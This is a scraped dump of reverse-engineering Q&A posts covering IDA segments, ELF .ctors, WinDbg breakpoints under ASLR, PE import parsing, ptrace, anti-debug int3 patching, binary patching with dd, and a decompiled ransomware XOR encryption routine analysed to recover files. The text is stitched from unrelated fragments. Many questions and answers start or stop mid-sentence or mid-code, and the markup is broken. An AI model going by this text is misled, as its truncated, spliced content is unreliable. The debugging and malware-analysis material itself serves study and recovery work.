<p>I would be less worried about the c++/C difference versus differences in system libaries, and the system call interface. It certainly wouldn't hurt to analyze the driver for your own edification, but you may find that it gets most of its work done by calling mac system libraries that don't work the same way in linux. You will be most interested in reading the parts of the driver that define the communication with the camera. At any rate, you wont be able to directly convert the KeXT into a Linux Kernal Module. </p>

<p><strong>My Final Advice:</strong></p>

<p>Instead, if your current webcam isn't working with your linux distro, I would first confirm that you have the proper generic driver, and then edit the generic driver to support your camera. You can do a pull request on the generic driver. </p>

<p>In most cases the communications with these cameras are very simple serial communications. I suspect that triggering an error from the generic driver will be faster than trying to decipher the mac driver. </p>

<p>This is using an obfuscation technique to make the disassembling harder. When I check in gdb I see the real code at 0x8049445:</p>

","<p>Most tools don't support a 'ignore that byte for disassembly' feature, only IDA, Hopper and a few others do.</p>

<p>The only alternative is to patch the byte at <code>8049444</code> with a <code>90 NOP</code>, or change your mind and not rely on basic tools.</p>

<p>Currently I am trying to recover the content of some ELF binaries compiled from <code>c++</code> program.. </p>

<p>So I am wondering if there is a way to get the content of <code>ctors</code> which equals to what <code>g++</code> produced?</p>

<h3>Update:</h3>

<p>Thanks a lot for @Igor's help. But I am still trapped in looking for <code>class's</code> <code>constructor</code> and <code>destructor</code>  info from ELF binary.</p>

<p>When evolving <code>class</code> definition, g++ would produce these info in the <code>.ctors</code> section:</p>

<pre><code>    .globl  _ZN8ComputerC1Ev
    .set    _ZN8ComputerC1Ev,_ZN8ComputerC2Ev
    .globl  _ZN8ComputerD1Ev
    .set    _ZN8ComputerD1Ev,_ZN8ComputerD2Ev
</code></pre>

<p>Generally <code>_ZN8ComputerC2Ev</code> is the name of a class's constructor while <code>_ZN8ComputerD2Ev</code> is its  destructor.</p>

<p>However, I just can not find corresponding info in the <code>objdump</code> dumped <code>.ctors</code> or <code>.init_array</code> sections.. I also tried <code>.eh_frame</code> and <code>gcc_except_table</code>, but the information dumped is massive.. I can not figure out the meaning of those information..</p>

<p>Could anyone give me guide? </p>
","<p>The <code>.ctors</code> section is a list of pointers terminated with -1 (0xFFFFFFFF), so it does not make sense to disassemble it. If you rearrange the bytes as data, you get:</p>

<pre><code>__CTOR_LIST__: .long 0xffffffff
__CTOR_END__:  .long 0x00000000
</code></pre>

<p>So, for whatever reason, the resulting exe does not actually use the <code>.ctors</code> section. I suspect the linker instead placed the pointers into the new-style <code>.init_array</code> section. Note that it is, again, a list of pointers, and not code.</p>

<p><strong>Edit</strong>:</p>

<p>The <code>.ctors</code> or <code>.init_array</code> sections only contain so-called <em>constructor functions</em> - functions that need to be executed at startup, before the <code>main()</code> itself. These are usually compiler-generated functions that perform construction of global objects (such as <code>cin</code>, <code>cout</code> etc.), or other startup-related tasks. You can, in fact, add your own functions to that list using <a href=""https://stackoverflow.com/questions/2053029/how-exactly-does-attribute-constructor-work""><code>__attribute__((constructor))</code></a>.</p>

<p>What does <strong>not</strong> go there are general C++ class constructors - there is no need to execute those on startup. They will be called when and if you construct an object of a specific class - e.g. by declaring a variable or calling <code>operator new</code>.</p>

<p>You should not use the .rdata section as it's usually not not marked for execution of code. If you ignore this you will trigger DEP and changing the segment to allow code executions is obviously not recommended as well.</p>

<p>I would suggest to add a segment, extend the current segment or find some empty space in the current segment (maybe there's align bytes at the end). </p>

"ida pro stack variables in hex view","1186","","<p>You have the IDA View and Hex View right. When on IDA View you select an instruction you can see the instruction selected in Hex View as well. However, if you select a ""data instruction"" like ""Format          = dword ptr -10h"" which is a stack variable, you don't see it in the hex view. It doesn't select the bytes corresponding to the variable definition. I mean I know the variable is going to be there in memory but somewhere on the hex view should tell me ""hey allocate this stack variable"" but it doesn't.</p>

"IDA segmentation problem","1186","","<p>In the program I'm trying to reverse engineer, originally IDA only created three segments: <code>CODE</code>, <code>DATA</code> and <code>.idata</code>.</p>

<p>Using the information from the compiler source code (<a href=""http://pastebin.com/ParJ3683"" rel=""nofollow"">http://pastebin.com/ParJ3683</a> lines 30-78), I determined that infact DATA was concatenated out of (at least) four segments, <code>DATA</code>,<code>INITDATA</code>,<code>EXITDATA</code> and <code>BSS</code>.</p>

<p>So I created three new segments with the specified alignments (word/dword) and the appropriate boundaries; while all data appeared in the correct segment bounds, all references to what had been in the DATA segment and is now in BSS are now totally messed up:</p>

<pre><code>CODE:00401A8A                 push    ds:globalErrorMessagesCaption[eax*4] ; lpCaption
</code></pre>

<p>turned into </p>

<pre><code>CODE:00401A8A                 push    dword ptr ds:(algn_481049+187h)[eax*4] ; lpCaption
</code></pre>

_BSS:00481106                 ;org 481106h
</code></pre>

<p>What has gone wrong here and how can I fix it?</p>
","<p>Short answer: your newly created segments probably have an invalid selector value of 0, and things should start working again as soon as you set the selector to a valid value (e.g. <code>SetSegmentAttr(here, SEGATTR_SEL, 1)</code> at the command prompt). The reason is that all selectors created by IDA for a PE32(+) have the same base and are mostly equivalent.</p>

<p>Long answer:</p>

<p>There are certain differences between recent IDA versions in the way segment editing via the UI works. Segment editing via the UI can cause complex operations under the hood, and the resulting behaviour is not always intuitive. That's why I'd rather not give a solution in terms of UI operations.</p>

<p>The segment editing functions available in IDC and Python are much simpler and straightforward, and they can be invoked from IDA's command prompt (including symbolic names for flag values, like SEGMOD_KEEP). For trickier stuff I find it most convenient to compose my own operations as named snippets in the code snippet editor (Shift-F2). With a suitable Jump() at the end of the operation - to position the cursor on the most likely candidate for the next operation - this makes it easy to get a lot of stuff done in no time flat. </p>

<p>The IDC/Python segment editing functions are slightly better documented than the whole UI stuff and, being simpler, they are easier to get a handle on by way of experimentation. And much less prone to nasty surprises. If bad things have happened - as in your case - they can often be repaired by probing a working example in one IDA instance with commands like this:</p>

<pre><code>GetSegmentAttr(here, SEGATTR_FLAGS)
</code></pre>

<p>and then switching to the other IDA instance containing the 'patient' and poking in the newly discovered value:</p>

<pre><code>SetSegmentAttr(here, SEGATTR_FLAGS, 0x10)
</code></pre>

<p>Since both IDA instances share the same command prompt history, entering the second command is as simple as hitting the up arrow and modifying the query that was entered in the other IDA instance. In your case things will probably start working again if you set <strong>SEGATTR_SEL</strong> for the newly created segments to the same value as an existing (and hence correctly configured) segment. To find the magic flags and their names I prefer grepping <code>$(IDA)/idc/idc.idc</code> over consulting the help file, since idc.idc tends to be more comprehensive and more up to date.</p>

<p>Note: view windows like ""Program Segmentation"" do not refresh on their own but they can be refreshed by hitting their hotkey again (e.g. Shift-F7 for ""Program Segmentation""), and also by entering ""RefreshLists()"" at the command prompt. Also, all the stuff I wrote here is probably far from optimal, but it's the best I am able to do based on my limited knowledge and existing documentation...</p>

<p>Last but not least, segments are not very significant for PE32(+) targets with their flat address spaces. I find them convenient for tagging ranges of code as belonging to a certain module (e.g. 'CRT', 'Lua', whatever) but it is not really necessary to create a faithful representation of the segments contained in the source code, since they are mostly for the benefit of the linker and end up being merged into a tiny number of PE sections.</p>

"Reverse engineering windows service","1184","","<p>I'm trying to reverse engineer a driver that consists of 2 components, a windows service and a control panel application. My goal of reverse engineering is to replace the control panel with my own program.</p>

<p>Now as far as I can see I have a few possible approaches:</p>

<ol>
<li>I try to reverse engineer the control panel, and discover the calls sent. But this panel consists of a lot of bloatware.</li>
<li>I try to reverse engineer the service, and discover the input needed. But this service also handles other (unknown) functions.</li>
<li>I try to catch the communication between the panel and the service.</li>
</ol>

<p>Now 3 would be the easiest approach, but I have no idea if this is technically possible. Then I tried option 2, but i can only statically analyze the exe, Since dynamic analysis causes it to crash prematurely. Option 1 seems to be the most logical one, and this was the first I tried, but I can't really find an interesting starting point.</p>

<p>Is there anyone who can point me in the right direction. I have some reverse engineering experience from crackme's and applications, but this is my first attempt at reversing a driver.</p>
","<p>If you goal is ultimately to control the service, it make more sense to reverse it versus reversing control panel. Who knows, you might find functionality you were not aware of. The key part of reversing windows service is to realize that it runs within the context of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685150%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><strong>Service Control Manager</strong></a>, and simply running the executable will not work. There are several major components of any windows service, that you need to be aware of. I have already given an answer to <a href=""https://reverseengineering.stackexchange.com/questions/2235/how-does-services-exe-trigger-the-start-of-a-service/2237#2237""><strong>How does services.exe trigger the start of a service?</strong></a> question. It describes inner workings of a windows service.</p>

<p>It is very much possible to reverse a Windows service both dynamically and statically as long as you understand underlining concepts. If you run your service in context of command prompt, it will fail. Every Windows service by design has to call to Service Control Manager, if that call fails it means the service is not executed within the SCM. It is expected to fail being executed outside of the SCM. If services expects input, you will have to figure out what it needs. Firstly, you will need to locate Service Worker Thread. Thereafter, locating part of the way it communicates to control panel should be easy. </p>

<p>How should I config IDA Pro to handle this interrupt/exception in dynamic analyzing?<br>
I'm Using the local win32 debugger</p>
","<p>The code is expecting an exception to occur, which will happen in the absence of a debugger.  If a debugger is present, the breakpoint exception will usually be suppressed by the debugger, and execution will continue at either 0x455067 or 0x455068, depending on the debugger.</p>

<p>You have two simple choices: one choice is that you could just let execution reach 0x455084 and then change var_1 back to zero (or whatever value that it had originally).  What you don't want is for it to have the value of ""1"".</p>

<p>The other choice is to change the byte at 0x455065 from 0xCD to 0xFF (for example) and then let that execute.  This sequence will cause an exception to occur, which is really what you want to happen (note that the exception code won't be correct, so you'll need to watch if the code checks for a 0x80000003, and take that code path).  The execution will be transferred to the handler at 0x455076, at which point you can change the byte at 0x455065 back to 0xCD (in case the code is self-checking), and then resume debugging.</p>

"How to find all functions in DLL","1175","","<p>I'm looking for a way to get the addresses of all the functions in a DLL in the .text section. Is there a way to do it without using a disassembler and moving through the commands? How does IDA know to identify all the functions, even if their start is not the regular ""push ebp, mov ebp esp""?</p>

<p>Thanks!</p>
","<p>You can get a list of all <em>exported</em> functions just by reading the PE headers. But, that won't give you any function names, or expected arguments lists (*), and it won't give you any functions that are internal to the DLL.</p>

<p>In the general case, the only thing you can do is start with exported functions, disassemble from there, follow <code>jmp</code>s, and mark everything that's <code>call</code>ed as a new function and process it in the same way that you process the exported stuff. This is basically what IDA does.</p>

<p>As C0000022L mentioned, this is in no way trivial, especially with C++ methods that are never called directly, but only through vtable pointers, which is why even IDA gets this kind of stuff <em>mostly</em> right, but not <em>completely</em> right.</p>

<p>Ida has another feature though, named FLIRT -  it has a database that has signatures of standard library functions for many different compilers. Which is why it can, often, identify standard library function names. But as far as i know, this is a second pass thing; first IDA identifies functions by being called from somewhere, then tries to assign names to those functions using FLIRT. Of course, this helps with standard library functions ONLY, and building this kind of database certainly needs a lot of work as well.</p>

<p>(*) If you're lucky, functions will be exported by name, and if you're very lucky, and the DLL was written in C++, the function name will include the signature. So there are cases when the export list is valuable. But this isn't the generic case, when a function might just be exported by ordinal.</p>

</code></pre>

<p>I've added my understanding of what's going on in comments on the right for the body of the method that I am interested in.</p>

<p>For example, incrementing the variable would involve moving a value onto a register and then operating on it. I would expect <code>i++</code> to look something like</p>

<pre><code>mov     eax, [ebp+var_4]
inc     eax             
</code></pre>

<p>But the actual instructions involved an extra move</p>

<pre><code>mov     eax, [ebp+var_4]  
mov     ecx, eax         // &lt;----- ?
inc     eax               
</code></pre>

<p>In the add instruction, the extra move isn't there. When I modified the code with a decrement operation, I see that extra move as well.</p>

<p>Is there some purpose for this move from <code>eax</code> to <code>ecx</code> ?</p>

<p>UPDATE:</p>

<p>I am still reading about registers, and from what I've read <code>ecx</code> is used as a counter, but from this code it isn't obvious what it's being used for, if anything.</p>
","<p>TCC was written to be fast and simple without most optimizations. It compiles the program in only one pass and use a very limited number of registers (eax, ecx and edx, I think). So don't suppose for it to be efficient and don't surprise when it does something ""stupidly"".</p>

<blockquote>
  <p>On x86, three temporary registers are used. When more registers are needed, one register is spilled into a new temporary variable on the stack.</p>

<blockquote>
  <p>TCC generates code in a single pass, and does not perform most of the optimizations performed by other compilers such as GCC. TCC compiles every statement on its own, and at the end of each statement register values are written back to the stack and must be re-read even if the next line uses the values in registers (creating extraneous save/load pairs between statements). TCC uses only some of the available registers (e.g., on x86 it never uses ebx, esi, or edi because they need to be preserved across function calls).[4]</p>

"Windbg x64 setting breakpoint","1166","","<p>My issue is all about setting the breakpoint on x64 Windbg. 
For x86 to combine IDA and Windbg analysis nothing is required. Just copy and paste the IDA address value and it works just fine.
For instance, in x86 I have <code>sub_401000</code>, so, the corresponding breakpoint is set by <code>bp 401000</code><br>
In x64 I have address <code>sub_140001000</code>, so, I'm trying to set as follows <code>bp 140001000</code> and get no result at all. Application won't reach my breakpoint. That's why, I've just set <code>bp 1401172F1</code> that reaches the address of interest for sure.</p>

<p>But now I've faced with error </p>

<pre><code>Unable to insert breakpoint 0 at 00000001`401172f1, Win32 error 0n998
The breakpoint was set with BP.  If you want breakpoints
to track module load/unload state you must use BU.
bp0 at 00000001`401172f1 failed
WaitForEvent failed

<p>All these answers make sense, but setting breakpoint for this rva leads to error for some reason. Maybe I should try something else?</p>

</code></pre>
","<p>The error is due to the specified address belonging to an unmapped page. Normally, you would follow the advice in the debugger and use '<code>bu</code>', which monitors new memory maps and adds the breakpoint when that page is mapped (soft breakpoints write opcodes to the memory location).</p>

<p>In this case, it appears that you are trying to break on the main executable, which should be loaded before you are given interactive access in the debugger. It's likely that ASLR has relocated your main image. You can use the '<code>lm</code>' command or access the loaded modules dialog through the toolbar to observe the base address of the module you are interested in. </p>

<p>The preferred base address from the PE header is what IDA uses when loading the image. Subtract the base address shown in IDA (140001000) from your target address (00000001401172f1) to get the RVA (1162f1), and add that to the base address indicated by the module list in Windbg. </p>

"IDA Pro C dump for Decryption function","1153","","<p>I have been battling this infection I got that encrypts my files in 512 byte chunks with a friend. We have managed to find the Decryption function we think in IDA (the code is <em>heavily</em> obfuscated) from a user who paid for the decrypter. Below is the C dump of the encryption function:</p>

<pre><code>int __stdcall sub_40C78E(int a1, int a2, int a3, int a4)
{
  int result;
  char v5; 
  int v6; 
  int v7; 
  int v8; 

  v7 = a1;
  v6 = a2;
  v5 = 0;
  result = 0;
  if ( a2 )
  {
    v8 = a3;
    do
    {
      LOBYTE(v8) = v5 + v8;
      *(_BYTE *)v7 ^= v8;
      v5 = *(_BYTE *)v7++;
      v8 = __ROL__(a4 + v8, 8);
      --v6;
    }
    while ( v6 );
    result = v8;
  }
  return result;
}
</code></pre>

<p>My friend tried to simplify it or make sense of it and this is what he came up with:</p>

<pre><code>int __stdcall sub_40C78E((_BYTE *)buffer, int nonce1, int nonce2)
{
  char v5; 
  int n; 
  int v8; 

  n = 0x400;    // It is a little bit confusing, because the length of block is 0x200 (rest of buffer is filled by 0).
                        // Only first 0x200 bytes are saved to a file for block CT0A.
  v5 = 0;
  v8 = nonce1;

  do
  {
      LOBYTE(v8) = v5 + LOBYTE(v8);
      *buffer ^= LOBYTE(v8);
      v5 = *buffer;

      v8 = __ROL__(nonce2 + v8, 8);
      --n;
  }
  while ( n );

return v8;       
}
</code></pre>

<p>Where nonce1 and nonce2 is suppose to represent some kind of key.</p>

<p>What we have found with this infection is that if you XOR the first byte of the cipher text with the plain text, you get a key byte you can use to get the first byte of every file back. Which makes sense with this function because the first time in the loop the key is added to 0, which means it is simply the key. But then this guy used some type of weird CFB type xor encryption where it uses the previous xor'ed byte with the key next.</p>

<p>I just don't quite understand the function and I was hoping somewhere here could perhaps simplify it more for me or explain it. I also know C#, and VB if anyone would know how to explain the function in these languages.</p>
","<p>As you expected, it's doing a very simple XOR.  The equivalent code looks something like this:</p>

{
  int result = 0;
  // ch is the next byte (character) in the buffer
  char ch = 0; 
  int count = bufsize; 
  char *ptr = buff; 
  int x;

  for (x = nonce1; count; --count)
  {
      // this bit of trickery just replaces the low 8 bits
      // of x with the low 8 bits of (x+ch) neglecting carry, if any
      x = (x &amp; ~0xff) | ((x+ch) &amp; 0xff);
      // XOR the buffer with the calculated x value
      *ptr ^= x;
      // read in the next character into ch
      ch = *ptr++;
      // obfuscate by adding nonce2 
      x += nonce2;
      // if x = 0x12345678, this would make it 0x34567812
      // for 32-bit ints.  Just a rotate left of 8 bits.
      x = (x&lt;&lt;8) | ((x &gt;&gt;((sizeof(int)-1)*8) ) &amp; 0xff);  
  }
  result = x;
  // return the last calculated x which may be used to chain all
  // of the blocks together.  That is, the return value x is

"OllyDBG's disassembled syntax and c-equivalent","1151","","<p>This is probably a pretty simple question as I'm not too used to how the syntax looks for OllyDBG's disassembler. </p>

<p>Does this following assembler statement:</p>

<pre><code>MOV EAX, DWORD PTR [ESI + 14]
</code></pre>

<p>Be roughly translated to this C code:</p>

<pre><code>eax = *(esi + 0x14);
</code></pre>

<p>Have I understood the syntax correctly or am I misunderstanding this? </p>
","<p>The <code>DWORD PTR [expression]</code> syntax means ""take the value of <code>expression</code>, interpret it as an address, and access 4 (size of a <code>DWORD</code>) bytes starting with that address"". But assembly data types are rather different from those of C, so many C types can be accessed this way.</p>

<p>The instruction you provided is basically equivalent to C code:</p>

<pre><code>typedef dword_t ...;
dword_t eax = *(dword_t *)((char *)esi + 0x14);
</code></pre>

<p>This instruction can be used to access 4 contiguous bytes no matter what the C type of those bytes is - in the line above, you could (on a 32 bit system) define <code>dword_t</code> as <code>int</code>, <code>float</code>, <code>void *</code> or another type of the appropriate size, and it would still work the same way, it's just bits and bytes travelling from one place to another. With a reasonably smart compiler, this can even be used to read entire structs or arrays in one step, as long as their length is small enough.</p>

<blockquote>
  <p>But this later on could be used as a pointer if that's what you'd like?</p>
</blockquote>

<p>As I said, it is not possible to say what the original C type of those bytes is just from this context. You have to look at other places where this value is used and look for indicators of the specific type. If you see it used in <code>[eax]</code> or a similar expression - it's probably a pointer. If it's used in a more complex expression, like <code>[eax + ecx]</code>, one of the two is a pointer and the other is an array index/byte displacement from that pointer, but there's no telling which is which just from that line, more context is needed.</p>

","<p><strong>TL;DR</strong> you can call anything, locating the right part of code is the hard part.</p>

<p>If you mean 'just as Windows does', then you mean the functions of the DLL that are available to the others, ie the exported ones? in this case, you need to parse the export table - check <a href=""http://code.google.com/p/pefile/source/browse/trunk/pefile.py#3349"">pefile</a> for a readable and reliable implementation.</p>

<h1>locating any function</h1>

<h2>IDA</h2>

<p>If you actually mean 'all the functions, including the internal ones', then you need to disassemble and tell the difference from code and data. in this case, your best bet is to open the files in IDA - with symbols preferrably - and export the function list.</p>

<h2>manually</h2>

<p>If you want to do that manually, then you need your own smart disassembler, which is far from trivial: sometimes, compilers generate some code that doesn't immediately look like parts of a function.</p>

<h2>calling identified functions</h2>

<p>Once you've located the functions, you can just call them directly, without the need of injection, but you have to make sure you have the exact same version of the DLL. <a href=""https://code.google.com/p/corkami/source/browse/trunk/src/PE/hard_imports.asm"">hard_imports</a> use such a method to call pieces of code directly.</p>

<p>Are these real strings or they broken encrypted or something?
How can I achieve this?</p>
","<p>These are not real strings, thats just binary data that can be interpreted as strings. That's how tools like BinText work - by trying to evaluate any sequence of bytes as a string and accepts it as one when a threshold is passed (usually around 4 characters).</p>

<p>I'm not familiar with BinText, but the tool I frequently use for such tasks is 010 Editor (<a href=""http://www.sweetscape.com/010editor"" rel=""nofollow"">http://www.sweetscape.com/010editor</a>). It's a really good text and hex editor and it has a free trial license. It can basically edit anything on your computer (text and binary files, hard drive, processes), has templates for parsing known file formats, scripts and advanced binary search options. The feature you're looking for is their ""Find Strings"" option that finds all strings regardless of formats and can be easily tuned with a few parameters. </p>

<p>Because strings may be represented in several formats having a tool that's aware of that and supports searching multiple formats simultaneously can be really helpful with these type of searches. </p>

<p>Obviously the strings may be obfuscated and in that case searching won't do, but that's a bit out of the scope of this question. Open another one and I'll answer that as well. </p>

"NOP instruction","1139","","<p>I have recently learned that <code>nop</code> instruction is actually <code>xchg eax, eax</code>... what it does is basically exchanges <code>eax</code> with itself. </p>

<p>As far as CPU goes, does the exchange actually happen?</p>
","<p>There are several instructions, which could be used depending on the compiler. <code>xchg eax, eax</code> is byte code 90. It is a legit instruction, which takes up a single processing cycle. In addition, there are several other instructions, which could be used in place of <code>xchg eax, eax</code>: </p>

<pre><code>lea eax, [eax + 0x00]    byte code 8D 40 00
mov eax, eax             byte code 89 C0

<p>Since all of those instructions are different length, compiler chooses one of the most appropriate versions depending on alignment requirements. </p>

"How to know if PE Header import function is being imported by Ordinal rather than by name","1137","","<p>I want to know how to find out if an imported function in a PE header is being imported by ordinal rather than by name because I came across an executable that does that. Here is the DLL that imports all functions by ordinal except for one (from <code>WS2_32.dll</code>):</p>

<p>Screenshot from program called <code>ExeinfoPE</code>
<a href=""https://i.stack.imgur.com/W3zGE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/W3zGE.png"" alt=""enter image description here""></a></p>

<p>This is what I'm doing to get to the imports:</p>

<ol>
<li>Read the PE header.</li>
<li>Loop over data directories and find <code>IMAGE_DIRECTORY_ENTRY_IMPORT</code>.</li>
<li><p>Once <code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> is found, loop over <code>IMAGE_IMPORT_DESCRIPTORS</code>.</p></li>
<li><p>On each <code>IMAGE_IMPORT_DESCRIPTORS</code>, extract all the functions.</p></li>
</ol>

<p>Here is how I extract the functions (only works for functions imported by name):</p>

<pre><code>void extractFunctions(IMAGE_IMPORT_DESCRIPTOR dll, uintptr_t sectionStartAddrRaw) {
    uintptr_t selectedFunctionImport = dll.Characteristics + sectionStartAddrRaw;
    uintptr_t selectedFunctionImportIAT = dll.FirstThunk + sectionStartAddrRaw;

    while (true) {
        IMAGE_THUNK_DATA thunkPtrToImportByName = *(IMAGE_THUNK_DATA*)selectedFunctionImport;
        selectedFunctionImport += sizeof(IMAGE_THUNK_DATA); //Next loop we'll loop over to the next IMAGE_THUNK_DATA.
        if (thunkPtrToImportByName.u1.Function == NULL) { //Check if we need to exit the looping since there are no more functions to import.
            break;
        }

        IMAGE_IMPORT_BY_NAME* functionImport = (IMAGE_IMPORT_BY_NAME*)(thunkPtrToImportByName.u1.Function + sectionStartAddrRaw);

        Function function;
        function.name = std::string(functionImport-&gt;Name); //Access violation here if the function needs to be imported by ordinal, instead of by name.
        function.locationInIAT = selectedFunctionImportIAT;
        function.locationInOriginalIAT = selectedFunctionImportIAT - sectionStartAddrRaw + header.OptionalHeader.ImageBase;

        selectedFunctionImportIAT += sizeof(IMAGE_THUNK_DATA);
        dlls.back().functions.push_back(function); //We assume that IMAGE_IMPORT_DESCRIPTOR dll is the last one in the dlls vector.]
    }
}
</code></pre>

<p>I noticed that every function Hint/Ordinal inside <code>ExeinfoPE</code> that is imported by name is <code>0</code>. However, in my code <code>functionImport-&gt;Hint</code> is always set to something, regardless if the function is supposed to be imported by name or ordinal.</p>

<p>The <code>IMAGE_IMPORT_DESCRIPTOR</code> cannot have information on whether the functions inside that <code>IMAGE_IMPORT_DESCRIPTOR</code> are imported by ordinal or name, since one of the functions is imported by name and all of the others are imported by ordinal. So, I'm all out of ideas here.</p>

<p>Here are the data structures I'm using for your reference so no need to Google:</p>

<pre><code>typedef struct _IMAGE_THUNK_DATA {
    union {
        uint32_t* Function;             // address of imported function

        PIMAGE_IMPORT_BY_NAME AddressOfData;        // RVA of imported name
        DWORD ForwarderStringl              // RVA to forwarder string
    } u1;
} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics; /* 0 for terminating null import descriptor  */
        DWORD   OriginalFirstThunk; /* RVA to original unbound IAT */
    } DUMMYUNIONNAME;

    DWORD   TimeDateStamp;  /* 0 if not bound,

"Why/how is GDB allowed to attach to a process and read/write to attached process' address space?","1135","","<p>The fact that GDB can attach to any process without having su rights is terrifying to me. For example, what prevents me from writing a malware/virus(/whatever the correct term is) that uses same system calls with GDB to attach to any processes, send interrupts, change instructions on the fly, add breakpoints to branching instructions to alter ZF etc.?</p>

<p>You can clearly do lots of harmful things with this ability. For example, I'm doing some minor hacks using some GDB Python scripts and I can't see what's preventing me from writing some seriously dangerous/malicious stuff.</p>

<p>So I have some number of questions related with how is this possible and how is this safe:</p>

<p>(I'm assuming that it's the operating system who allows a process to somehow send interrupts to some other one, and access to it's address space and alter the memory. Please correct me if I'm wrong)</p>

<p>1) What makes this safe? What prevents me from writing a program that alters behaviours of every single process running in a system?</p>

<p>2) What system calls are involved? How does operating system give me access to address space of some other process, while not taking my own address space from me. (e.g. GDB has it's own address space, but it can also read attached process' address space)</p>

<p>3) In my user-level program, is it possible to detect this kind of ""attaching""? Like, can I print a message and terminate if another process is attached to my program? How do I detect this?</p>

<p>(I'm using ""attaching"" as ""starting writing/reading my address space"")</p>

<p>Thanks.</p>
","<p>2) The system call is <a href=""http://en.wikipedia.org/wiki/Ptrace"" rel=""noreferrer""><code>ptrace</code></a>. That call has lots of functionality, including ""copy a section of the tracee's memory into a local buffer in my address space"" and the reverse ""copy my buffer to the tracee's memory"". These are quite similar to windows' <code>ReadProcessMemory</code>  and <code>WriteProcessMemory</code>. The tracing program needs to use these to access memory in the traced program.</p>

<p>1) The fact that you can't, really, attach to processes that aren't yours, unless you have <code>root</code> access, or (on Linux), the <code>CAP_SYS_PTRACE</code> capability. In some newer Linuxes, you don't even have rights to <code>ptrace</code> all of your own processes, depending on the <code>yama</code> settings and whether the traced process is a (grand)child of the tracing process. The wikipedia page explains this in more detail.</p>

<p>3) No, you can't. At least not reliably. Whichever trick you'd want to use could be intercepted by the tracer. Also, you generally don't want to do this, since you need <code>ptrace</code> to debug your program, and whoever has rights to <code>ptrace</code> you could screw you in various other ways as well. However, a process can't have more than one tracer attached at a time, so you could have a master process that spawns and <code>ptrace</code>s the worker, so noone else can attach to the worker to trace it. Of course, the worker would still need a way to check if it's parent is alive (compare <code>getppid()</code> with 1 for example) and that the tracer isn't intercepting your <code>getppid()</code> calls and patching them to return the old parent id.</p>

"Using GDB to modify an executable","1134","","<p>I'm working on an assignment for a systems programming class, and for extra credit we are asked to modify an executable to allow it to accept the reverse of our PIN (finding the PIN was the original assignment). I was able to use GDB to change the memory values being stored for the PIN to the reverse, and when I run the program it works as intended. The only issue is that I can't save these changes to the executable. Once I exit the debugger it reverts to normal. I've tried using ""set write on"" and ""gdb -write "" before making changes, but the changes still wouldn't stick. Does anyone know if what I'm tyring to do is even possible, or where I might be going wrong?</p>
","<p>Did you remember to reload your program after <code>set write on</code> ?</p>

<p>And did you load your (writable) copy of the original program (as opposed to the professor's copy in a shared location that everyone has read access to, but noone can write) ?</p>

<p>Actually, i've never used gdb to patch files directly, i normally use a hex editor.</p>

<p>If you don't have a hex editor on your system, maybe you have <code>xxd</code>, which allows you to turn a binary into a hex dump and vice versa.</p>

<p>If all else fails, you can still do something like</p>

<pre><code>echo 'X' | dd of=binary.file bs=1 seek=12345 count=1

<p>The MMU contains a lookup table - which virtual address range maps to which physical addres range. Whenever the processor accesses memory, it tells the mmu which virtual address to access; the MMU uses its lookup table to determine the actual physical address, and that's what it puts on the address bus. But, the processor doesn't care about this translation. What you see in Ollydbg is always the virtual address, never the physical one.</p>

<p>The MMU entries are handled inside the operating system, which may rearrange them as it sees fit. For example, the OS may decide to need the RAM block at 60000 for something else, copy the block at 60000 to, for example, 20000, and update the MMU table. Your program won't notice anything of that - it still accesses the same virtual memory location, which is now at a different place in physical memory.</p>

<p>This page fault will make the processor call the page fault handler within the operating system. The OS keeps a list of which pages it has written to disk, finds a memory location that's currently unused, reads the required page from disk to that location, updates the MMU accordingly, then returns to the user program and re-executes the instruction that generated the page fault. The user program won't know anything about that (unless it tries hard to find out, for example by measuring the real time needed and comparing that to the expected time). In Windows, <code>perfmon</code>s <code>Ram/Page faults per second</code> counter will tell you how often that happened.</p>

<p>(Actually, there are different kinds of page faults. Space in the MMU tables is quite limited, it normally doesn't map all of a user program's virtual addresses. When a page fault occurs, the OS first checks ""Is that block of memory in RAM somewhere, with only the MMU entry missing?"". If yes, the OS just generates the MMU entry and allows the program to continue. This is called a minor page fault, which is quite fast to handle; page faults that actually access the disk are called major page faults, and impact performance much more).</p>

"Treating independent code as a function in IDA Pro","1128","","<p>When reverse engineering programs, I often find functions like the one below.  This function in particular has a set of nested if/else blocks (pink boxes) which would typically be fairly easy to follow. When code executes at the blue box however, the code becomes messy and can take either of two independent code paths (purple or yellow).  If the developer had used a function (or not used an inline function) for the purple or yellow code blocks, this code would be much easier to reverse engineer. As a function, I can rename and comment on the code block, and the overall program becomes easier to read.</p>

<p>My usual technique when I come across this kind of function is to apply colors to the code blocks like you see in the graph below. Is there a way for IDA to treat an arbitrary collection of code blocks as a function that is not called and/or are there better approaches to dealing with inline code and independent code blocks?</p>

"Question about LEA instruction","1122","","<p>i'm learning to reverse engineer. So i'm coding some programs and try to understand their assembly.
I stumbled upon a curious case and i think i can't solve it alone.</p>

<p>Here's the c code:</p>

<pre><code> #include &lt;stdio.h&gt;

int main(){

char *texto = ""O numero e %d\n"";
int i = 10;

while(i){
    printf(texto, i--);
}

return 0;
}
</code></pre>

<p>The assembly produced by IDA is the following:</p>

<pre><code>mov     eax, [esp+28]
lea     edx, [eax-1] ; The part i don't understand
mov     [esp+28], edx
mov     [esp+4], eax
mov     eax, [esp+18h]
mov     [esp], eax      ; char *
call    _printf
</code></pre>

<p>What i could understand is that it stores the old value in eax and pushes to stack(I purposedly didn't turn on optimizations) and then it pushes the format.
While that happens in the middle it does the <code>i--</code>, but i can't understand how it's working. So it get's the address of <code>eax-1</code> and stores in <code>edx</code> and then stores it in <code>i</code>, but <code>eax</code>doesn't hold an address but a value.</p>

<p>Thanks in advance.</p>
","<p>What you're seeing is an efficiency trick that compilers like to use.</p>

<p>Internally, the CPU doesn't make a difference between numbers and addresses - 32 bit integers and pointers are the same thing. (Or 64 bit, if you're using newer architecture, but as your register names start with <code>e</code>, you're using 32 bit).</p>

